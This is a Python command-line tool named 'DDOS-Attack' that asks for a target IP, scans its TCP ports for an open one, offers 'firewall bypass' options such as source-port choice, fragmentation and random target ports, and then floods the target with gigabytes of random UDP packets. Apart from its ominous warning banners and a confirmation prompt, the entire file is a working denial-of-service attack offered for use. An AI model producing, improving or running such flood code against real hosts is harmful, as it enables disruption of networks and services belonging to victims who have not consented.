import sys
import os
import time
import socket
import ipaddress
import random

# ==================== Startup ASCII Art & Legal Warning ====================

os.system("clear")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
print("M       MMM M       MMM MMM     MMM MM       MM   BC-809")
print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   BC-809")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   BC-809")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   BC-809")
print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   BC-809")
print("M        MM M        MM MMM     MMM MM       MM   BC-809")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
print("SEVERE WARNING")
print("You have touched the edge of law and ethics. Exit now, or wait 3 seconds.")
time.sleep(1)
print("3")
time.sleep(1)
print("2")
time.sleep(1)
print("1")
time.sleep(1)
print("Starting...")
time.sleep(2)

os.system("clear")
os.system("figlet DDOS-Attack")
print("Author    : BCU-0")
print("GitHub    : https://github.com/BC-809/DDOS-Attack.git")
print("")

# ==================== Parameter Input & Validation ====================

# Target IP validation
while True:
    try:
        ip_str = input("[?] IP Target : ").strip()
        ipaddress.ip_address(ip_str)
        target_ip = ip_str
        break
    except ValueError:
        print("[!] Invalid IP address, please try again.")

# Target port validation
user_provided_port = False
target_port = None
while True:
    try:
        port_str = input("[?] Port (press Enter to use auto-discovery): ").strip()
        if port_str == "":
            target_port = None
            break
        port = int(port_str)
        if 1 <= port <= 65535:
            target_port = port
            user_provided_port = True
            break
        else:
            print("[!] Port must be between 1 and 65535.")
    except ValueError:
        print("[!] Invalid port number. Enter a number, or press Enter for auto-discovery.")

# Total traffic input (in GB)
while True:
    try:
        gb_str = input("[?] Total data to send (GB) : ").strip()
        total_gb = float(gb_str)
        if total_gb <= 0:
            print("[!] Traffic must be greater than 0 GB.")
            continue
        break
    except ValueError:
        print("[!] Invalid number, please enter a numeric value.")

# Optional rate limit (packet interval)
rate_limit = 0.0
try:
    rate_str = input("[?] Packet interval in seconds (0 = max speed, e.g. 0.1) : ").strip()
    rate_limit = float(rate_str)
except ValueError:
    rate_limit = 0.0

# ---------- Firewall Bypass Options ----------
print("\n--- Firewall Bypass Options (experimental) ---")
src = input("[?] Specify source port (leave blank for random): ").strip()
source_port = int(src) if src else None

frag = input("[?] Enable IP fragmentation? (y/N): ").strip().lower()
use_fragmentation = (frag == 'y')

rnd = input("[?] Use random target port? (y/N): ").strip().lower()
random_target_port = (rnd == 'y')

# Set payload size based on fragmentation
if use_fragmentation:
    PACKET_SIZE = 3000
else:
    PACKET_SIZE = 1490

total_bytes = int(total_gb * 1024 * 1024 * 1024)
max_packets = total_bytes // PACKET_SIZE
print(f"\n[*] Will send {max_packets} packets, total {total_gb:.2f} GB.")
if rate_limit > 0:
    print(f"[*] Packet interval: {rate_limit} sec")
if source_port is not None:
    print(f"[*] Source port: {source_port}")
if use_fragmentation:
    print(f"[*] IP fragmentation enabled, payload size {PACKET_SIZE} bytes")
if random_target_port:
    print("[*] Random target port mode enabled")

# ==================== Port Discovery Functions (bulk scan, real-time output) ====================

def check_target(ip, port):
    """Simple TCP connectivity test, returns True/False"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        s.connect((ip, port))
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def discover_open_port(ip, port_range):
    """Scan a range of ports, return first open port, print each port being probed."""
    print(f"[*] Scanning ports {min(port_range)}-{max(port_range)}, please wait...")
    try:
        for p in port_range:
            print(f"[>] Probing port: {p}")
            if check_target(ip, p):
                return p
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user.")
        return None
    return None

# ==================== Determine Final Attack Port ====================

if target_port is not None and user_provided_port:
    print(f"[*] Checking connectivity of port {target_port}...")
    if check_target(target_ip, target_port):
        final_port = target_port
        print(f"[+] Port {final_port} is reachable, will use directly.")
    else:
        print(f"[!] Port {target_port} is unreachable.")
        scan_choice = input("[?] Start port scan to find an available port? (y/n): ").strip().lower()
        if scan_choice == 'y':
            print("\nSelect scan mode:")
            print("1. Quick scan (common ports)")
            print("2. Full port scan (1-65535, time-consuming)")
            print("3. Custom range")
            mode = input("[?] Enter option (1/2/3): ").strip()
            if mode == '1':
                ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
            elif mode == '2':
                ports = range(1, 65536)
            elif mode == '3':
                try:
                    start_port = int(input("[?] Start port: "))
                    end_port = int(input("[?] End port: "))
                    if start_port < 1 or end_port > 65535 or start_port > end_port:
                        print("[!] Invalid port range, using quick scan.")
                        ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
                    else:
                        ports = range(start_port, end_port + 1)
                except ValueError:
                    print("[!] Invalid input, using quick scan.")
                    ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
            else:
                print("[!] Invalid option, using quick scan.")
                ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]

            alt_port = discover_open_port(target_ip, ports)
            if alt_port is not None:
                print(f"[+] Found open port: {alt_port}")
                final_port = alt_port
            else:
                print("[!] No open port discovered.")
                while True:
                    force_choice = input("[?] Force send using the original port? (y/n): ").strip().lower()
                    if force_choice == 'y':
                        final_port = target_port
                        print(f"[*] Will force send using original port {final_port}.")
                        break
                    elif force_choice == 'n':
                        print("[*] Attack cancelled by user.")
                        sys.exit(0)
                    else:
                        print("[!] Please enter y or n.")
        else:
            while True:
                force_choice = input("[?] Force send using the original port? (y/n): ").strip().lower()
                if force_choice == 'y':
                    final_port = target_port
                    print(f"[*] Will force send using original port {final_port}.")
                    break
                elif force_choice == 'n':
                    print("[*] Attack cancelled by user.")
                    sys.exit(0)
                else:
                    print("[!] Please enter y or n.")
else:
    print("[*] No port specified, starting port scan...")
    print("Select scan mode:")
    print("1. Quick scan (common ports)")
    print("2. Full port scan (1-65535, time-consuming)")
    print("3. Custom range")
    mode = input("[?] Enter option (1/2/3): ").strip()
    if mode == '1':
        ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
    elif mode == '2':
        ports = range(1, 65536)
    elif mode == '3':
        try:
            start_port = int(input("[?] Start port: "))
            end_port = int(input("[?] End port: "))
            if start_port < 1 or end_port > 65535 or start_port > end_port:
                print("[!] Invalid port range, using quick scan.")
                ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
            else:
                ports = range(start_port, end_port + 1)
        except ValueError:
            print("[!] Invalid input, using quick scan.")
            ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
    else:
        print("[!] Invalid option, using quick scan.")
        ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]

    final_port = discover_open_port(target_ip, ports)
    if final_port is None:
        print("[!] No open port found and no port specified; cannot continue.")
        sys.exit(1)
    print(f"[+] Discovery successful, will use open port: {final_port}")

# ==================== Show Attack Start Screen ====================

os.system("clear")
os.system("figlet Attack Starting")

# ==================== Final Confirmation (moved under figlet) ====================

print(f"\n[*] Attack will use target port: {final_port}")
while True:
    confirm = input("\n[!] FINAL WARNING: You are about to send massive UDP traffic to the target. Confirm (yes/no): ").strip().lower()
    if confirm == 'yes':
        break
    elif confirm == 'no':
        print("[*] Cancelled by user.")
        sys.exit(0)
    else:
        print("[!] Please enter yes or no.")

# ==================== Attack Send Loop ====================

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

if source_port is not None:
    try:
        sock.bind(('', source_port))
    except OSError as e:
        print(f"[!] Cannot bind source port {source_port}: {e}")
        sock.close()
        sys.exit(1)

frag_enabled = False
if use_fragmentation:
    try:
        if hasattr(socket, 'IP_MTU_DISCOVER') and hasattr(socket, 'IP_PMTUDISC_DO'):
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)
            frag_enabled = True
        else:
            raise AttributeError("IP_MTU_DISCOVER not available")
    except (AttributeError, OSError) as e:
        print(f"[!] Unable to enable IP fragmentation ({e}), falling back to normal mode (payload 1490 bytes).")
        PACKET_SIZE = 1490
        total_bytes = int(total_gb * 1024 * 1024 * 1024)
        max_packets = total_bytes // PACKET_SIZE
        print(f"[*] Adjusted total packets: {max_packets}")

payload = os.urandom(PACKET_SIZE)

sent = 0
sent_bytes = 0
next_mb_threshold = 1024 * 1024
start_time = time.time()

try:
    while sent < max_packets:
        if random_target_port:
            current_port = random.randint(1, 65535)
        else:
            current_port = final_port

        sock.sendto(payload, (target_ip, current_port))
        sent += 1
        sent_bytes += PACKET_SIZE

        if not random_target_port:
            final_port += 1
            if final_port > 65534:
                final_port = 1

        if sent_bytes >= next_mb_threshold:
            gb_sent = sent_bytes / (1024 * 1024 * 1024)
            elapsed = time.time() - start_time
            pps = sent / elapsed if elapsed > 0 else 0
            print(f"[>] Sent: {sent} packets ({gb_sent:.4f} GB) | Time: {elapsed:.1f}s | Rate: {pps:.1f} pps")
            next_mb_threshold += 1024 * 1024

        if rate_limit > 0:
            time.sleep(rate_limit)

except KeyboardInterrupt:
    print("\n[!] Sending stopped by user.")
except Exception as e:
    print(f"\n[!] Error: {e}")
finally:
    sock.close()
    elapsed = time.time() - start_time
    print(f"\n[+] Attack finished. Total packets: {sent}, Total data: {sent_bytes / (1024*1024*1024):.4f} GB, Time: {elapsed:.2f} sec.")
